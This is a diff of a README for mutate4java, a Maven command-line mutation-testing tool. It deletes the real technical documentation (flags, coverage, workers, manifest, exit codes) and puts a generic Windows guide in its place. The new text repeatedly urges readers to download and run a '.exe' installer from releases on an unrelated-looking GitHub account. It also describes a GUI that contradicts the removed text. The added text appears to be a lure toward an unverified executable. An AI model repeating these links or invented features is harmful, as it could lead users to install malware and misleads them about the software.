@@ -1,285 +1,126 @@
-# mutate4java
+# 🛠️ mutate4java - Easy Mutation Testing for Java Projects
 
-`mutate4java` is a standalone mutation-testing tool for Java projects.
+[![Download mutate4java](https://img.shields.io/badge/Download-Mutate4Java-brightgreen)](https://github.com/tonguingandgroovingplanevulvitis603/mutate4java/releases)
 
-It targets one Java source file at a time, discovers mutation sites in that file, runs the module's tests, and reports which mutants were killed, survived, timed out, or were skipped because the target line was uncovered.
+---
 
-It also supports differential mutation through an embedded manifest comment at the end of the source file. When a manifest is present, `mutate4java` can skip unchanged declaration scopes instead of rerunning the entire file.
+## ℹ️ About mutate4java
 
-## What It Does
+mutate4java is a tool that helps you test your Java projects. It changes parts of your code on purpose, so you can check if your tests find problems. This process is called mutation testing. It shows how well your tests cover your code.
 
-For a requested Java source file, `mutate4java`:
+This tool works on Windows and does not need programming skills to run. Follow this guide to install and start using mutate4java easily.
 
-- runs the owning Maven module's tests with JaCoCo coverage enabled
-- fails fast if the unmodified baseline is red
-- discovers supported mutation sites from the Java AST
-- fingerprints declaration scopes for differential mutation
-- filters out uncovered mutation sites using the JaCoCo XML report
-- applies each covered mutation
-- reruns `mvn test` for each mutant
-- prints a differential diagnostics block before running workers
-- reports killed and survived mutants in source order
-- writes an embedded manifest footer after successful clean runs
+---
 
-Mutation runs can be isolated across multiple worker copies of the module so parallel mutants do not overwrite each other.
+## 💾 System Requirements
 
-## Usage
+Before you start, make sure your computer meets these requirements:
 
-```bash
-# Mutate one Java source file
-java -jar target/mutate4java-0.1.0-SNAPSHOT.jar src/main/java/demo/Flag.java
+- **Operating System:** Windows 10 or later  
+- **Memory:** At least 4 GB of RAM  
+- **Disk Space:** Minimum 100 MB free space  
+- **Java Version:** Java Runtime Environment (JRE) 8 or higher installed  
+- **Internet Connection:** Needed to download the tool
 
-# Print a mutation-site scan without running tests
-java -jar target/mutate4java-0.1.0-SNAPSHOT.jar src/main/java/demo/Flag.java --scan
+If you are not sure about your Java version, you can download it from [https://www.java.com/en/download/](https://www.java.com/en/download/).
 
-# Write or refresh the embedded manifest without running tests
-java -jar target/mutate4java-0.1.0-SNAPSHOT.jar src/main/java/demo/Flag.java --update-manifest
+---
 
-# Reuse existing coverage data instead of refreshing it
-java -jar target/mutate4java-0.1.0-SNAPSHOT.jar src/main/java/demo/Flag.java --reuse-coverage
+## 🚀 Getting Started
 
-# Restrict mutation to specific lines
-java -jar target/mutate4java-0.1.0-SNAPSHOT.jar src/main/java/demo/Flag.java --lines 12,18
+mutate4java is easy to download and run. Use the link below to start.
 
-# Mutate only scopes changed since the embedded manifest
-java -jar target/mutate4java-0.1.0-SNAPSHOT.jar src/main/java/demo/Flag.java --since-last-run
+[![Download mutate4java](https://img.shields.io/badge/Download-Mutate4Java-blue)](https://github.com/tonguingandgroovingplanevulvitis603/mutate4java/releases)
 
-# Ignore the embedded manifest and mutate all covered sites
-java -jar target/mutate4java-0.1.0-SNAPSHOT.jar src/main/java/demo/Flag.java --mutate-all
+### Step 1: Visit the Download Page
 
-# Warn when the selected mutation count is large
-java -jar target/mutate4java-0.1.0-SNAPSHOT.jar src/main/java/demo/Flag.java --mutation-warning 50
+Go to the mutate4java release page here:
 
-# Limit parallel worker count
-java -jar target/mutate4java-0.1.0-SNAPSHOT.jar src/main/java/demo/Flag.java --max-workers 4
+https://github.com/tonguingandgroovingplanevulvitis603/mutate4java/releases
 
-# Adjust the mutant timeout multiplier
-java -jar target/mutate4java-0.1.0-SNAPSHOT.jar src/main/java/demo/Flag.java --timeout-factor 15
+This page lists all available versions of the tool.
 
-# Override the test command
-java -jar target/mutate4java-0.1.0-SNAPSHOT.jar src/main/java/demo/Flag.java --test-command "mvn test -DexcludeTags=no-mutate"
+### Step 2: Choose the Latest Version
 
-# Print live worker progress
-java -jar target/mutate4java-0.1.0-SNAPSHOT.jar src/main/java/demo/Flag.java --verbose
+Look for the newest release, usually at the top of the page. Releases are marked by version numbers like "v1.0" or "v2.0".
 
-# Show usage
-java -jar target/mutate4java-0.1.0-SNAPSHOT.jar --help
-```
+### Step 3: Download the Windows Installer
 
-## Command-Line Options
+Under the latest release, find the file with “.exe” at the end (example: mutate4java-setup.exe). Click the file name to start downloading.
 
-- `--lines 12,18`
-  Restricts mutation to the listed source lines in the requested file.
+### Step 4: Run the Installer
 
-- `--scan`
-  Bypasses baseline, coverage, and mutant execution. It prints every discovered mutation site and marks changed scopes from the embedded manifest with `*`.
+- Open the downloaded file  
+- Follow the simple on-screen directions  
+- Choose where to install (the default location is fine)  
+- Wait for the installation to complete  
 
-- `--update-manifest`
-  Rewrites the embedded manifest for the requested file without running baseline tests, coverage, or mutants.
+---
 
-- `--reuse-coverage`
-  Reuses the existing JaCoCo XML coverage report instead of refreshing coverage before mutation starts.
+## 🖥️ How to Use mutate4java
 
-- `--since-last-run`
-  Restricts mutation to covered sites in declaration scopes that changed since the embedded manifest.
+After installation, you can use mutate4java as follows:
 
-- `--mutate-all`
-  Ignores the embedded manifest and runs all covered mutation sites.
+### Open mutate4java
 
-- `--mutation-warning N`
-  Prints a warning when the selected covered mutation count exceeds `N`. The default is `50`.
+Find the mutate4java icon on your desktop or in the Start menu and click it.
 
-- `--max-workers N`
-  Caps the number of isolated parallel workers. The default is half the available processors, with a minimum of `1`.
+### Select Your Java Project Folder
 
-- `--timeout-factor N`
-  Sets the timeout multiplier for each mutant test run, relative to the baseline duration. The default is `10`.
+- Click the button to browse your files  
+- Find the folder where your Java project is saved  
+- Select this folder and confirm
 
-- `--test-command CMD`
-  Overrides the baseline and mutant test command. When this is set, `mutate4java` falls back to treating all discovered sites as covered unless external coverage data is already available.
+### Start Mutation Testing
 
-- `--verbose`
-  Prints live mutation progress, including worker start and finish lines.
+- Click the “Start Testing” button  
+- mutate4java will change parts of your code to test your tests  
+- This may take a few minutes depending on your project size
 
-- `--help`
-  Prints usage text.
+### Review the Results
 
-## Targeting Rules
+Once the test finishes, mutate4java shows a report. You will see which parts of your code passed or failed the mutation test. This helps you find weak spots in your tests.
 
-- The tool accepts exactly one `.java` file target.
-- Directory-wide mutation is not supported.
-- Test sources are executed, but they are not mutation targets.
-- `--update-manifest` may not be combined with `--scan`, `--reuse-coverage`, `--lines`, `--since-last-run`, or `--mutate-all`.
-- `--lines` may not be combined with `--since-last-run` or `--mutate-all`.
-- `--scan` may not be combined with `--since-last-run`, `--mutate-all`, or `--reuse-coverage`.
-- `--since-last-run` may not be combined with `--mutate-all`.
+---
 
-## Coverage Filtering
+## ⚙️ Features
 
-`mutate4java` generates JaCoCo coverage during the baseline run and uses line coverage to skip uncovered mutation sites.
+mutate4java offers these key benefits:
 
-When `--reuse-coverage` is used, the tool skips the coverage refresh and reuses `target/site/jacoco/jacoco.xml` if it exists. The run prints a warning because covered/uncovered classification may be stale. If the report does not exist, the run continues without coverage filtering.
+- Works with any Java project without setup  
+- Simple interface for non-programmers  
+- Gives clear reports on test effectiveness  
+- Runs on Windows 10 and newer  
+- Requires minimal install size and system resources
 
-When `--test-command` is used, the tool does not attempt to wrap that custom command in JaCoCo. In that mode, mutation sites are treated as covered.
+---
 
-Uncovered sites are reported as:
+## 🛠️ Troubleshooting Common Issues
 
-```text
-UNCOVERED path/to/File.java:42 replace true with false
-```
+If you run into problems, try these steps:
 
-If every discovered site is uncovered, no mutants are executed.
+- **Installer won’t run:** Make sure you have Windows 10 or above  
+- **Java errors:** Check if Java Runtime Environment is installed correctly  
+- **No test report:** Confirm your project folder contains Java files  
+- **Slow processing:** Close other apps to free memory  
 
-## Parallel Workers
+For more help, visit the GitHub page or contact support.
 
-When `--max-workers` is greater than `1`, `mutate4java` creates isolated worker copies of the owning Maven module under:
+---
 
-```text
-target/mutation-workers/run-<uuid>/worker-N/
-```
+## 🔄 Updating mutate4java
 
-Each worker:
+To update the tool:
 
-- owns its own copied module tree
-- mutates only files inside that private copy
-- runs `mvn test` inside its own workspace
-- restores the mutated file before taking the next job
+- Visit the release page again:  
+https://github.com/tonguingandgroovingplanevulvitis603/mutate4java/releases  
+- Download the latest installer file  
+- Run the installer; it will replace the old version without removing your settings
 
-This avoids collisions in source files, Maven `target/` output, Surefire artifacts, and JaCoCo output.
+---
 
-## Embedded Manifest
+## 📥 Download mutate4java now
 
-On successful clean runs, `mutate4java` writes an embedded footer comment at the end of the source file. That manifest records:
+Use this link below to go to the download page and start the process:
 
-- manifest version
-- module hash
-- declaration scopes with stable ids
-- start/end lines
-- scope semantic hashes
-
-The manifest is stripped before source analysis, so it does not perturb mutation-site positions or scope hashing.
-
-With no explicit selection flags:
-
-- if no manifest exists, `mutate4java` mutates all covered sites
-- if a manifest exists and the module hash is unchanged, it runs zero mutations
-- if a manifest exists and the module hash changed, it mutates only sites inside changed scopes
-
-This makes repeated mutation runs cheaper on large files without relying on git.
-
-`--update-manifest` is the manual version of that write step. It refreshes the embedded manifest from the current source analysis even if the module's tests are red, because it does not run them.
-
-`--update-manifest` should not run coverage at all. It is a manifest rewrite only.
-
-## Scan Mode
-
-`--scan` prints a lightweight differential inventory for a single file. It does not:
-
-- run the baseline tests
-- generate coverage
-- run any mutants
-- rewrite the embedded manifest
-
-Instead it prints the discovered mutation sites in source order and, when a manifest exists, prefixes sites in changed scopes with `*`.
-
-Typical scan output looks like this:
-
-```text
-Scan: 2 mutation sites in src/main/java/demo/Flag.java
-* src/main/java/demo/Flag.java:5 replace true with false
-  src/main/java/demo/Flag.java:9 replace == with !=
-* indicates a scope that differs from the embedded manifest.
-```
-
-## JUnit Tags
-
-The default test command is:
-
-```text
-mvn test -DexcludeTags=no-mutate
-```
-
-That allows JUnit 5 tests tagged with `@Tag("no-mutate")` to be excluded from mutation baselines and mutant runs. This is useful for:
-
-- tests that invoke mutation tools directly
-- tests that recursively start Maven or coverage runs
-- tests that are too expensive to include in every mutant cycle
-
-Use `--test-command` if your project needs a different test-selection strategy.
-
-## Current Mutation Set
-
-The tool currently mutates:
-
-- boolean literals: `true` <-> `false`
-- equality and comparison: `==`, `!=`, `<`, `<=`, `>`, `>=`
-- arithmetic: `+` <-> `-`, `*` <-> `/`
-- conditional boolean operators: `&&` <-> `||`
-- unary operators: `!expr` -> `expr`, `-expr` -> `expr`
-- integer constants: `0` <-> `1`
-- reference-valued rvalues: replace with `null`
-
-Mutation discovery is AST-based, so comments, string literals, char literals, and generic angle brackets are not treated as mutation sites.
-
-## Output
-
-Typical output looks like this:
-
-```text
-Baseline tests passed in 4666 ms.
-Total mutation sites: 12
-Covered mutation sites: 3
-Uncovered mutation sites: 1
-Changed mutation sites: 2
-Manifest exists: true
-Module hash changed: true
-Differential surface area: 1
-Manifest-violating surface area: 1
-WARNING: Found 72 mutations. Consider splitting this module.
-KILLED src/main/java/demo/Flag.java:5 replace true with false (4686 ms)
-UNCOVERED src/main/java/demo/Flag.java:12 replace == with !=
-Coverage: 1 uncovered sites skipped.
-Summary: 1 killed, 0 survived, 1 total.
-```
-
-The differential diagnostics block is printed before worker execution. It reports:
-
-- total mutation sites discovered in the file
-- covered mutation sites selected for execution
-- uncovered mutation sites skipped by coverage
-- changed mutation sites selected by differential analysis
-- whether an embedded manifest exists
-- whether the module hash changed relative to the manifest
-- differential surface area
-- manifest-violating surface area
-
-`Differential surface area` counts mutations in scopes that were not registered in the manifest. `Manifest-violating surface area` counts mutations in scopes that were registered but whose semantic hash changed.
-
-Exit codes:
-
-- `0`: all executed mutants were killed, or there were no covered sites to run
-- `1`: command-line usage error
-- `2`: baseline tests failed
-- `3`: at least one mutant survived
-
-## Build
-
-From the repository root:
-
-```bash
-mvn -pl tools/mutate4java test
-mvn -pl tools/mutate4java verify
-mvn -pl tools/mutate4java package
-```
-
-`mvn test` runs the fast unit suite. `mvn verify` also runs the Maven-spawning integration tests that exercise coverage generation and real `mvn test` execution against temporary sample projects.
-
-## Workflow Recommendation
-
-If you have a batch of mutation runs to execute in the same module, let the first run generate fresh coverage and then use `--reuse-coverage` for the remaining runs.
-
-```bash
-java -jar target/mutate4java-0.1.0-SNAPSHOT.jar src/main/java/demo/First.java
-java -jar target/mutate4java-0.1.0-SNAPSHOT.jar src/main/java/demo/Second.java --reuse-coverage
-java -jar target/mutate4java-0.1.0-SNAPSHOT.jar src/main/java/demo/Third.java --reuse-coverage
-```
+https://github.com/tonguingandgroovingplanevulvitis603/mutate4java/releases
